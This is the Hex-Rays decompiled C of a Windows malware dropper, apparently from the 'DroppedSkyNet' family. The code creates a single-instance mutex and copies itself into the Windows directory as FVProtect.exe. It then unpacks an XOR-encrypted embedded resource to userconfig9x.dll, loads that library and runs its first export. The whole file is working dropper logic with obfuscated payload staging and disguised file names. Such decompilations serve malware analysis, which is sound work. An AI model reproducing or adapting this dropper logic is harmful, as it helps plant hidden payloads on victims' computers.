/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

int sub_401000();
int __cdecl sub_40101E(int);
BOOL __cdecl sub_401028(LPCVOID lpBuffer, LPCSTR lpFileName);
BOOL sub_4010DA();
int __stdcall start(int, int, int, int);

//-------------------------------------------------------------------------
// Data declarations

// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern BOOL (__stdcall *WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// extern HANDLE (__stdcall *CreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern DWORD (__stdcall *SizeofResource)(HMODULE hModule, HRSRC hResInfo);
// extern LPVOID (__stdcall *LockResource)(HGLOBAL hResData);
// extern HGLOBAL (__stdcall *LoadResource)(HMODULE hModule, HRSRC hResInfo);
// extern HRSRC (__stdcall *FindResourceA)(HMODULE hModule, LPCSTR lpName, LPCSTR lpType);
// extern HMODULE (__stdcall *GetModuleHandleA)(LPCSTR lpModuleName);
// extern BOOL (__stdcall *CopyFileA)(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, BOOL bFailIfExists);
// extern LPSTR (__stdcall *lstrcatA)(LPSTR lpString1, LPCSTR lpString2);
// extern UINT (__stdcall *GetWindowsDirectoryA)(LPSTR lpBuffer, UINT uSize);
// extern DWORD (__stdcall *GetModuleFileNameA)(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern HMODULE (__stdcall *LoadLibraryA)(LPCSTR lpLibFileName);
// extern DWORD (__stdcall *GetTickCount)();
// extern DWORD (__stdcall *GetLastError)();
// extern HANDLE (__stdcall *CreateMutexA)(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCSTR lpName);
LPCSTR lpLibFileName = "userconfig9x.dll"; // idb
LPCSTR lpName = "'D'r'o'p'p'e'd'S'k'y'N'e't'"; // idb
CHAR Type[] = "BINARY"; // idb
CHAR aFvprotectExe[] = "FVProtect.exe"; // idb
CHAR String2[] = "\\"; // idb
int dword_4030E4 = 0; // weak
int dword_4030E8 = 0; // weak


//----- (00401000) --------------------------------------------------------
int sub_401000()
{
  dword_4030E8 = 214013 * dword_4030E8 + 2531011;
  return (dword_4030E8 >> 16) & 0x7FFF;
}
// 4030E8: using guessed type int dword_4030E8;

//----- (0040101E) --------------------------------------------------------
int __cdecl sub_40101E(int a1)
{
  int result; // eax

  result = a1;
  dword_4030E8 = a1;
  return result;
}
// 4030E8: using guessed type int dword_4030E8;

//----- (00401028) --------------------------------------------------------
BOOL __cdecl sub_401028(LPCVOID lpBuffer, LPCSTR lpFileName)
{
  HMODULE ModuleHandleA; // esi
  HRSRC ResourceA; // ebx
  HGLOBAL Resource; // eax
  DWORD v5; // esi
  DWORD i; // ebx
  DWORD NumberOfBytesWritten; // [esp+Ch] [ebp-4h] BYREF
  _BYTE *lpBuffera; // [esp+18h] [ebp+8h]
  CHAR *lpFileNamea; // [esp+1Ch] [ebp+Ch]

  NumberOfBytesWritten = 0;
  ModuleHandleA = GetModuleHandleA(0);
  ResourceA = FindResourceA(ModuleHandleA, (LPCSTR)(unsigned __int16)lpBuffer, Type);
  Resource = LoadResource(ModuleHandleA, ResourceA);
  lpBuffera = LockResource(Resource);
  if ( !lpBuffera )
    return 0;
  v5 = SizeofResource(ModuleHandleA, ResourceA);
  lpFileNamea = (CHAR *)CreateFileA(lpFileName, 0x40000000u, 0, 0, 2u, 0x80u, 0);
  if ( lpFileNamea == (CHAR *)-1 )
    return 0;
  for ( i = 0; i < v5; ++i )
    lpBuffera[i] ^= sub_401000() % 256;
  WriteFile(lpFileNamea, lpBuffera, v5, &NumberOfBytesWritten, 0);
  CloseHandle(lpFileNamea);
  return NumberOfBytesWritten == v5;
}

//----- (004010DA) --------------------------------------------------------
BOOL sub_4010DA()
{
  CHAR Filename[1056]; // [esp+8h] [ebp-C64h] BYREF
  CHAR String1[1060]; // [esp+428h] [ebp-844h] BYREF
  CHAR Buffer[1056]; // [esp+84Ch] [ebp-420h] BYREF

  GetModuleFileNameA(0, Filename, 0x400u);
  GetWindowsDirectoryA(Buffer, 0x400u);
  GetWindowsDirectoryA(String1, 0x400u);
  if ( Buffer[1054] != 92 )
    lstrcatA(Buffer, String2);
  lstrcatA(Buffer, aFvprotectExe);
  if ( String1[1056] != 92 )
    lstrcatA(String1, String2);
  lstrcatA(String1, lpLibFileName);
  sub_401028((LPCVOID)0x65, String1);
  return CopyFileA(Filename, Buffer, 0);
}

//----- (00401189) --------------------------------------------------------
int __stdcall start(int a1, int a2, int a3, int a4)
{
  int TickCount; // eax
  HMODULE ModuleHandleA; // eax
  void (*ProcAddress)(void); // eax

  dword_4030E4 = (int)CreateMutexA(0, 0, lpName);
  if ( GetLastError() != 183 )
  {
    sub_40101E(0);
    sub_4010DA();
    TickCount = GetTickCount();
    sub_40101E(TickCount);
    ModuleHandleA = GetModuleHandleA(lpLibFileName);
    if ( !ModuleHandleA || ModuleHandleA == (HMODULE)-1 )
      ModuleHandleA = LoadLibraryA(lpLibFileName);
    if ( ModuleHandleA )
    {
      if ( ModuleHandleA != (HMODULE)-1 )
      {
        ProcAddress = (void (*)(void))GetProcAddress(ModuleHandleA, (LPCSTR)1);
        if ( ProcAddress )
          ProcAddress();
      }
    }
  }
  return 0;
}
// 4030E4: using guessed type int dword_4030E4;

// nfuncs=5 queued=5 decompiled=5 lumina nreq=0 worse=0 better=0
// ALL OK, 5 function(s) have been successfully decompiled
